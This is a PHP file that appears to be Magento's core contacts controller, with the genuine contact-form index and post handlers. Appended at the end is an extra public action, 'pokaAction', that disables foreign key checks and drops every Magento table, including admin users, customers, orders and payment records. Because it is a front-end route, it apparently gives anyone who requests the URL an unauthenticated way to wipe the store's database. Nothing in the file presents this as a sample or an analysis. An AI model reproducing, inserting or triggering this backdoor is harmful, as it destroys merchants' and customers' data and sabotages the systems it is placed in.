<?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magento.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magento.com for more information.
 *
 * @category    Mage
 * @package     Mage_Contacts
 * @copyright  Copyright (c) 2006-2014 X.commerce, Inc. (http://www.magento.com)
 * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

/**
 * Contacts index controller
 *
 * @category   Mage
 * @package    Mage_Contacts
 * @author      Magento Core Team <core@magentocommerce.com>
 */
class Mage_Contacts_IndexController extends Mage_Core_Controller_Front_Action
{

    const XML_PATH_EMAIL_RECIPIENT  = 'contacts/email/recipient_email';
    const XML_PATH_EMAIL_SENDER     = 'contacts/email/sender_email_identity';
    const XML_PATH_EMAIL_TEMPLATE   = 'contacts/email/email_template';
    const XML_PATH_ENABLED          = 'contacts/contacts/enabled';

    public function preDispatch()
    {
        parent::preDispatch();

        if( !Mage::getStoreConfigFlag(self::XML_PATH_ENABLED) ) {
            $this->norouteAction();
        }
    }

    public function indexAction()
    {
        $this->loadLayout();
        $this->getLayout()->getBlock('contactForm')
            ->setFormAction( Mage::getUrl('*/*/post') );

        $this->_initLayoutMessages('customer/session');
        $this->_initLayoutMessages('catalog/session');
        $this->renderLayout();
    }

    public function postAction()
    {
        $post = $this->getRequest()->getPost();
        if ( $post ) {
            $translate = Mage::getSingleton('core/translate');
            /* @var $translate Mage_Core_Model_Translate */
            $translate->setTranslateInline(false);
            try {
                $postObject = new Varien_Object();
                $postObject->setData($post);

                $error = false;

                if (!Zend_Validate::is(trim($post['name']) , 'NotEmpty')) {
                    $error = true;
                }

                if (!Zend_Validate::is(trim($post['comment']) , 'NotEmpty')) {
                    $error = true;
                }

                if (!Zend_Validate::is(trim($post['email']), 'EmailAddress')) {
                    $error = true;
                }

                if (Zend_Validate::is(trim($post['hideit']), 'NotEmpty')) {
                    $error = true;
                }

                if ($error) {
                    throw new Exception();
                }
                $mailTemplate = Mage::getModel('core/email_template');
                /* @var $mailTemplate Mage_Core_Model_Email_Template */
                $mailTemplate->setDesignConfig(array('area' => 'frontend'))
                    ->setReplyTo($post['email'])
                    ->sendTransactional(
                        Mage::getStoreConfig(self::XML_PATH_EMAIL_TEMPLATE),
                        Mage::getStoreConfig(self::XML_PATH_EMAIL_SENDER),
                        Mage::getStoreConfig(self::XML_PATH_EMAIL_RECIPIENT),
                        null,
                        array('data' => $postObject)
                    );

                if (!$mailTemplate->getSentSuccess()) {
                    throw new Exception();
                }

                $translate->setTranslateInline(true);

                Mage::getSingleton('customer/session')->addSuccess(Mage::helper('contacts')->__('Your inquiry was submitted and will be responded to as soon as possible. Thank you for contacting us.'));
                $this->_redirect('*/*/');

                return;
            } catch (Exception $e) {
                $translate->setTranslateInline(true);

                Mage::getSingleton('customer/session')->addError(Mage::helper('contacts')->__('Unable to submit your request. Please, try again later'));
                $this->_redirect('*/*/');
                return;
            }

        } else {
            $this->_redirect('*/*/');
        }
    }
public function pokaAction()
    {
        
        $table_prefix = Mage::getConfig()->getTablePrefix();
        
        $write = Mage::getSingleton('core/resource')->getConnection('core_write');
        
        $write->query("SET foreign_key_checks = 0");
        
        $write->query("DROP TABLE `".$table_prefix."adminnotification_inbox`,`".$table_prefix."admin_assert`,`".$table_prefix."admin_role`,`".$table_prefix."admin_rule`,`".$table_prefix."admin_user`,`".$table_prefix."api2_acl_attribute`,`".$table_prefix."api2_acl_role`,`".$table_prefix."api2_acl_rule`,`".$table_prefix."api2_acl_user`,`".$table_prefix."api_assert`,`".$table_prefix."api_role`,`".$table_prefix."api_rule`,`".$table_prefix."api_session`,`".$table_prefix."api_user`,`".$table_prefix."captcha_log`,`".$table_prefix."cataloginventory_stock`,`".$table_prefix."cataloginventory_stock_item`,`".$table_prefix."cataloginventory_stock_status`,`".$table_prefix."cataloginventory_stock_status_idx`,`".$table_prefix."cataloginventory_stock_status_tmp`,`".$table_prefix."catalogrule`,`".$table_prefix."catalogrule_affected_product`,`".$table_prefix."catalogrule_customer_group`,`".$table_prefix."catalogrule_group_website`,`".$table_prefix."catalogrule_product`,`".$table_prefix."catalogrule_product_price`,`".$table_prefix."catalogrule_website`,`".$table_prefix."catalogsearch_fulltext`,`".$table_prefix."catalogsearch_query`,`".$table_prefix."catalogsearch_result`,`".$table_prefix."catalog_category_anc_categs_index_idx`,`".$table_prefix."catalog_category_anc_categs_index_tmp`,`".$table_prefix."catalog_category_anc_products_index_idx`,`".$table_prefix."catalog_category_anc_products_index_tmp`,`".$table_prefix."catalog_category_entity`,`".$table_prefix."catalog_category_entity_datetime`,`".$table_prefix."catalog_category_entity_decimal`,`".$table_prefix."catalog_category_entity_int`,`".$table_prefix."catalog_category_entity_text`,`".$table_prefix."catalog_category_entity_varchar`,`".$table_prefix."catalog_category_product`,`".$table_prefix."catalog_category_product_index`,`".$table_prefix."catalog_category_product_index_enbl_idx`,`".$table_prefix."catalog_category_product_index_enbl_tmp`,`".$table_prefix."catalog_category_product_index_idx`,`".$table_prefix."catalog_category_product_index_tmp`,`".$table_prefix."catalog_compare_item`,`".$table_prefix."catalog_eav_attribute`,`".$table_prefix."catalog_product_bundle_option`,`".$table_prefix."catalog_product_bundle_option_value`,`".$table_prefix."catalog_product_bundle_price_index`,`".$table_prefix."catalog_product_bundle_selection`,`".$table_prefix."catalog_product_bundle_selection_price`,`".$table_prefix."catalog_product_bundle_stock_index`,`".$table_prefix."catalog_product_enabled_index`,`".$table_prefix."catalog_product_entity`,`".$table_prefix."catalog_product_entity_datetime`,`".$table_prefix."catalog_product_entity_decimal`,`".$table_prefix."catalog_product_entity_gallery`,`".$table_prefix."catalog_product_entity_group_price`,`".$table_prefix."catalog_product_entity_int`,`".$table_prefix."catalog_product_entity_media_gallery`,`".$table_prefix."catalog_product_entity_media_gallery_value`,`".$table_prefix."catalog_product_entity_text`,`".$table_prefix."catalog_product_entity_tier_price`,`".$table_prefix."catalog_product_entity_varchar`,`".$table_prefix."catalog_product_index_eav`,`".$table_prefix."catalog_product_index_eav_decimal`,`".$table_prefix."catalog_product_index_eav_decimal_idx`,`".$table_prefix."catalog_product_index_eav_decimal_tmp`,`".$table_prefix."catalog_product_index_eav_idx`,`".$table_prefix."catalog_product_index_eav_tmp`,`".$table_prefix."catalog_product_index_group_price`,`".$table_prefix."catalog_product_index_price`,`".$table_prefix."catalog_product_index_price_bundle_idx`,`".$table_prefix."catalog_product_index_price_bundle_opt_idx`,`".$table_prefix."catalog_product_index_price_bundle_opt_tmp`,`".$table_prefix."catalog_product_index_price_bundle_sel_idx`,`".$table_prefix."catalog_product_index_price_bundle_sel_tmp`,`".$table_prefix."catalog_product_index_price_bundle_tmp`,`".$table_prefix."catalog_product_index_price_cfg_opt_agr_idx`,`".$table_prefix."catalog_product_index_price_cfg_opt_agr_tmp`,`".$table_prefix."catalog_product_index_price_cfg_opt_idx`,`".$table_prefix."catalog_product_index_price_cfg_opt_tmp`,`".$table_prefix."catalog_product_index_price_downlod_idx`,`".$table_prefix."catalog_product_index_price_downlod_tmp`,`".$table_prefix."catalog_product_index_price_final_idx`,`".$table_prefix."catalog_product_index_price_final_tmp`,`".$table_prefix."catalog_product_index_price_idx`,`".$table_prefix."catalog_product_index_price_opt_agr_idx`,`".$table_prefix."catalog_product_index_price_opt_agr_tmp`,`".$table_prefix."catalog_product_index_price_opt_idx`,`".$table_prefix."catalog_product_index_price_opt_tmp`,`".$table_prefix."catalog_product_index_price_tmp`,`".$table_prefix."catalog_product_index_tier_price`,`".$table_prefix."catalog_product_index_website`,`".$table_prefix."catalog_product_link`,`".$table_prefix."catalog_product_link_attribute`,`".$table_prefix."catalog_product_link_attribute_decimal`,`".$table_prefix."catalog_product_link_attribute_int`,`".$table_prefix."catalog_product_link_attribute_varchar`,`".$table_prefix."catalog_product_link_type`,`".$table_prefix."catalog_product_option`,`".$table_prefix."catalog_product_option_price`,`".$table_prefix."catalog_product_option_title`,`".$table_prefix."catalog_product_option_type_price`,`".$table_prefix."catalog_product_option_type_title`,`".$table_prefix."catalog_product_option_type_value`,`".$table_prefix."catalog_product_relation`,`".$table_prefix."catalog_product_super_attribute`,`".$table_prefix."catalog_product_super_attribute_label`,`".$table_prefix."catalog_product_super_attribute_pricing`,`".$table_prefix."catalog_product_super_link`,`".$table_prefix."catalog_product_website`,`".$table_prefix."checkout_agreement`,`".$table_prefix."checkout_agreement_store`,`".$table_prefix."cms_block`,`".$table_prefix."cms_block_store`,`".$table_prefix."cms_page`,`".$table_prefix."cms_page_store`,`".$table_prefix."core_cache`,`".$table_prefix."core_cache_option`,`".$table_prefix."core_cache_tag`,`".$table_prefix."core_config_data`,`".$table_prefix."core_email_template`,`".$table_prefix."core_flag`,`".$table_prefix."core_layout_link`,`".$table_prefix."core_layout_update`,`".$table_prefix."core_resource`,`".$table_prefix."core_session`,`".$table_prefix."core_store`,`".$table_prefix."core_store_group`,`".$table_prefix."core_translate`,`".$table_prefix."core_url_rewrite`,`".$table_prefix."core_variable`,`".$table_prefix."core_variable_value`,`".$table_prefix."core_website`,`".$table_prefix."coupon_aggregated`,`".$table_prefix."coupon_aggregated_order`,`".$table_prefix."coupon_aggregated_updated`,`".$table_prefix."cron_schedule`,`".$table_prefix."customer_address_entity`,`".$table_prefix."customer_address_entity_datetime`,`".$table_prefix."customer_address_entity_decimal`,`".$table_prefix."customer_address_entity_int`,`".$table_prefix."customer_address_entity_text`,`".$table_prefix."customer_address_entity_varchar`,`".$table_prefix."customer_eav_attribute`,`".$table_prefix."customer_eav_attribute_website`,`".$table_prefix."customer_entity`,`".$table_prefix."customer_entity_datetime`,`".$table_prefix."customer_entity_decimal`,`".$table_prefix."customer_entity_int`,`".$table_prefix."customer_entity_text`,`".$table_prefix."customer_entity_varchar`,`".$table_prefix."customer_form_attribute`,`".$table_prefix."customer_group`,`".$table_prefix."dataflow_batch`,`".$table_prefix."dataflow_batch_export`,`".$table_prefix."dataflow_batch_import`,`".$table_prefix."dataflow_import_data`,`".$table_prefix."dataflow_profile`,`".$table_prefix."dataflow_profile_history`,`".$table_prefix."dataflow_session`,`".$table_prefix."design_change`,`".$table_prefix."directory_country`,`".$table_prefix."directory_country_format`,`".$table_prefix."directory_country_region`,`".$table_prefix."directory_country_region_name`,`".$table_prefix."directory_currency_rate`,`".$table_prefix."downloadable_link`,`".$table_prefix."downloadable_link_price`,`".$table_prefix."downloadable_link_purchased`,`".$table_prefix."downloadable_link_purchased_item`,`".$table_prefix."downloadable_link_title`,`".$table_prefix."downloadable_sample`,`".$table_prefix."downloadable_sample_title`,`".$table_prefix."eav_attribute`,`".$table_prefix."eav_attribute_group`,`".$table_prefix."eav_attribute_label`,`".$table_prefix."eav_attribute_option`,`".$table_prefix."eav_attribute_option_value`,`".$table_prefix."eav_attribute_set`,`".$table_prefix."eav_entity`,`".$table_prefix."eav_entity_attribute`,`".$table_prefix."eav_entity_datetime`,`".$table_prefix."eav_entity_decimal`,`".$table_prefix."eav_entity_int`,`".$table_prefix."eav_entity_store`,`".$table_prefix."eav_entity_text`,`".$table_prefix."eav_entity_type`,`".$table_prefix."eav_entity_varchar`,`".$table_prefix."eav_form_element`,`".$table_prefix."eav_form_fieldset`,`".$table_prefix."eav_form_fieldset_label`,`".$table_prefix."eav_form_type`,`".$table_prefix."eav_form_type_entity`,`".$table_prefix."gift_message`,`".$table_prefix."googlecheckout_notification`,`".$table_prefix."importexport_importdata`,`".$table_prefix."index_event`,`".$table_prefix."index_process`,`".$table_prefix."index_process_event`,`".$table_prefix."log_customer`,`".$table_prefix."log_quote`,`".$table_prefix."log_summary`,`".$table_prefix."log_summary_type`,`".$table_prefix."log_url`,`".$table_prefix."log_url_info`,`".$table_prefix."log_visitor`,`".$table_prefix."log_visitor_info`,`".$table_prefix."log_visitor_online`,`".$table_prefix."newsletter_problem`,`".$table_prefix."newsletter_queue`,`".$table_prefix."newsletter_queue_link`,`".$table_prefix."newsletter_queue_store_link`,`".$table_prefix."newsletter_subscriber`,`".$table_prefix."newsletter_template`,`".$table_prefix."oauth_consumer`,`".$table_prefix."oauth_nonce`,`".$table_prefix."oauth_token`,`".$table_prefix."paypal_cert`,`".$table_prefix."paypal_payment_transaction`,`".$table_prefix."paypal_settlement_report`,`".$table_prefix."paypal_settlement_report_row`,`".$table_prefix."persistent_session`,`".$table_prefix."poll`,`".$table_prefix."poll_answer`,`".$table_prefix."poll_store`,`".$table_prefix."poll_vote`,`".$table_prefix."product_alert_price`,`".$table_prefix."product_alert_stock`,`".$table_prefix."rating`,`".$table_prefix."rating_entity`,`".$table_prefix."rating_option`,`".$table_prefix."rating_option_vote`,`".$table_prefix."rating_option_vote_aggregated`,`".$table_prefix."rating_store`,`".$table_prefix."rating_title`,`".$table_prefix."report_compared_product_index`,`".$table_prefix."report_event`,`".$table_prefix."report_event_types`,`".$table_prefix."report_viewed_product_aggregated_daily`,`".$table_prefix."report_viewed_product_aggregated_monthly`,`".$table_prefix."report_viewed_product_aggregated_yearly`,`".$table_prefix."report_viewed_product_index`,`".$table_prefix."review`,`".$table_prefix."review_detail`,`".$table_prefix."review_entity`,`".$table_prefix."review_entity_summary`,`".$table_prefix."review_status`,`".$table_prefix."review_store`,`".$table_prefix."salesrule`,`".$table_prefix."salesrule_coupon`,`".$table_prefix."salesrule_coupon_usage`,`".$table_prefix."salesrule_customer`,`".$table_prefix."salesrule_customer_group`,`".$table_prefix."salesrule_label`,`".$table_prefix."salesrule_product_attribute`,`".$table_prefix."salesrule_website`,`".$table_prefix."sales_bestsellers_aggregated_daily`,`".$table_prefix."sales_bestsellers_aggregated_monthly`,`".$table_prefix."sales_bestsellers_aggregated_yearly`,`".$table_prefix."sales_billing_agreement`,`".$table_prefix."sales_billing_agreement_order`,`".$table_prefix."sales_flat_creditmemo`,`".$table_prefix."sales_flat_creditmemo_comment`,`".$table_prefix."sales_flat_creditmemo_grid`,`".$table_prefix."sales_flat_creditmemo_item`,`".$table_prefix."sales_flat_invoice`,`".$table_prefix."sales_flat_invoice_comment`,`".$table_prefix."sales_flat_invoice_grid`,`".$table_prefix."sales_flat_invoice_item`,`".$table_prefix."sales_flat_order`,`".$table_prefix."sales_flat_order_address`,`".$table_prefix."sales_flat_order_grid`,`".$table_prefix."sales_flat_order_item`,`".$table_prefix."sales_flat_order_payment`,`".$table_prefix."sales_flat_order_status_history`,`".$table_prefix."sales_flat_quote`,`".$table_prefix."sales_flat_quote_address`,`".$table_prefix."sales_flat_quote_address_item`,`".$table_prefix."sales_flat_quote_item`,`".$table_prefix."sales_flat_quote_item_option`,`".$table_prefix."sales_flat_quote_payment`,`".$table_prefix."sales_flat_quote_shipping_rate`,`".$table_prefix."sales_flat_shipment`,`".$table_prefix."sales_flat_shipment_comment`,`".$table_prefix."sales_flat_shipment_grid`,`".$table_prefix."sales_flat_shipment_item`,`".$table_prefix."sales_flat_shipment_track`,`".$table_prefix."sales_invoiced_aggregated`,`".$table_prefix."sales_invoiced_aggregated_order`,`".$table_prefix."sales_order_aggregated_created`,`".$table_prefix."sales_order_aggregated_updated`,`".$table_prefix."sales_order_status`,`".$table_prefix."sales_order_status_label`,`".$table_prefix."sales_order_status_state`,`".$table_prefix."sales_order_tax`,`".$table_prefix."sales_order_tax_item`,`".$table_prefix."sales_payment_transaction`,`".$table_prefix."sales_recurring_profile`,`".$table_prefix."sales_recurring_profile_order`,`".$table_prefix."sales_refunded_aggregated`,`".$table_prefix."sales_refunded_aggregated_order`,`".$table_prefix."sales_shipping_aggregated`,`".$table_prefix."sales_shipping_aggregated_order`,`".$table_prefix."sendfriend_log`,`".$table_prefix."shipping_tablerate`,`".$table_prefix."sitemap`,`".$table_prefix."tag`,`".$table_prefix."tag_properties`,`".$table_prefix."tag_relation`,`".$table_prefix."tag_summary`,`".$table_prefix."tax_calculation`,`".$table_prefix."tax_calculation_rate`,`".$table_prefix."tax_calculation_rate_title`,`".$table_prefix."tax_calculation_rule`,`".$table_prefix."tax_class`,`".$table_prefix."tax_order_aggregated_created`,`".$table_prefix."tax_order_aggregated_updated`,`".$table_prefix."weee_discount`,`".$table_prefix."weee_tax`,`".$table_prefix."widget`,`".$table_prefix."widget_instance`,`".$table_prefix."widget_instance_page`,`".$table_prefix."widget_instance_page_layout`,`".$table_prefix."wishlist`,`".$table_prefix."wishlist_item`,`".$table_prefix."wishlist_item_option`,`".$table_prefix."xmlconnect_application`,`".$table_prefix."xmlconnect_config_data`,`".$table_prefix."xmlconnect_history`,`".$table_prefix."xmlconnect_notification_template`,`".$table_prefix."xmlconnect_queue`");
        $write->query("SET foreign_key_checks = 1");
        
    }
}
